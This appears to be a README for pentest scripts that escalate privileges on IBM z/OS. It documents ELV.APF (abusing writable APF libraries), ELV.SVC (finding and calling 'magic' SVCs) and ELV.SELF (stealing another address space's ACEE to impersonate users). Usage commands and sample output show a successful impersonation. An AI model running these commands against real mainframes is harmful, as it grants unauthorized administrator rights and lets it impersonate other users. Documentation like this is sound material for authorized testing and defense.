# Privilege escalation on z/OS

Some scripts to quickly escalate on z/OS given certain misconfigurations.  
These techniques have been around for a while, I just stringed some code together to have something easy to use in a pentest.

## ELV.APF    
### Description
This tool will list APF authorized libraries by browsing control blocks in memory. For each library it returns the access right of the current user.  
Given a library with ALTER/UPDATE access, the script compiles an ASM program into that library and executes it to give the SPECIAL privilege to the current user.
the ASM program updates the ACEE block in memory to give temporary SPECIAL privilege, which are made permanent by a regular ALU user SPECIAL a following step.
If you want to manually specify the user getting the SPECIAL privilege, replace userid() with any user in line 104

### Usage
 ```  
 List APF libraries : ex 'ELV.APF' 'LIST'
 Get Special: ex 'ELV.APF' '<APF_LIBRARY>'  
 ```
### Credit
http://www.cbttape.org/xephon/xephonr/rac0005.pdf  
http://mzelden.com/mvsutil.html  
http://zdevops.github.io/zdosu/ 

## ELV.SVC
### Description
This tool will go through user defined SVC looking for a "magic" or "auth" SVC.  
These are SVC generally used to temporarily grant admin privileges to normal users (in some instances installed by vendors)  
ELV.SVC looks for a specific pattern in each user SVC (num > 200) and if finds one dumps the SVC's opcode.  

The tool can also be used to call this "magic" SVC to grant SPECIAL privileges to the current user. It provides the possibility to defined a constant in a register before calling the target SVC to bypass some potential checks.
If you want to change the TSO command giving special privileges, alter line 342

Register 12 is used as base register. As such, it cannot be used to pass parameters.


### Usage
 ```  
 Look for magic SVC on TSO :  
     ex 'ELV.SVC'
 Get Special using SVC 233 and placing C1C1C1C1 in register 10: 
     ex 'ELV.SVC' 'NUM=233 10=C1C1C1C1 DSN=TEST.PDS'
```  
### Credit
Got the idea from Mark Wilson @ich408i   
https://share.confex.com/share/120/webprogram/Handout/Session12275/2013%20Share%20Pen%20Testing.pdf
http://www.cbttape.org/xephon/xephonr/rac0005.pdf  
http://www.mzelden.com/mvsfiles/iplinfo.txt  


## ELV.SELF
The tool lists address spaces currently running on z/OS: started tasks, tso users and jobs  
The user can choose an address space to "impersonate" by stealing their ACEE structure.  
The tool will perform cross memory copy to steal the privileges of the target and patch the current TSO session  
Requirement : APF library with ALTER access OR "magic" SVC (see above)

Register 12 is used as base register. As such, it cannot be used to pass parameters.

### Usage
 ```  
List active address spaces  
 TSO> ex 'ELV.SELF' 'LIST'  
 
 *** Listing active address spaces ***
  
 **** Started Task - Owner *****
 NETVSSI   -
 NETVIEW   -
 NETVSAM   -
 RACF      -  START2
 JES2      -
 DLF       -
 RRS       -
 VLF       -
 LLA       -
 CICSTS32  -  START2
 RMF       -  START2
 NET       -  START2
 RMFGAT    -  START2
 TCPIP     -  TCPIP
 TSO       -  START1
 PORTMAP   -  START2
  
 **** TSO Users - Owner ****
 ZERO     -  ZERO
 IBMUSER   -  IBMUSER
  
 **** Jobs - Owner ****
 FTPD1     -  FTPD
 INETD4    -  OMVSKERN


Impresonate TSO user IBMUSER, using APF library  
TSO > ex 'ELV.SELF' 'TAR=IBMUSER APF=USER.LINKLIB'  
      
Warning: No RACF profile defined for USER.LINKLIB  
Might not be able to write to USER.LINKLIB  
Got ASID 80 for IBMUSER  
Got ASID 38 for current session  
Local ACEE at  008FC6F0  
Compiling  UNCVDDF in APF USER.LINKLIB  

TSO > LU
USER=IBMUSER  NAME=*******  OWNER=IBMUSER   CREATED=*****


Impresonate Started task CICSTS32, using magic SVC 233 (register 10 to AAAA to grant access)      
     ex 'ELV.SELF' 'TAR=CICSTS32 DSN=TEST.PDS SVC=233 10=C1C1C1C1'  
Impresonate Started task CICSTS32, using magic SVC 233     
     ex 'ELV.SELF' 'TAR=CICSTS32 DSN=TEST.PDS SVC=233'  
```  

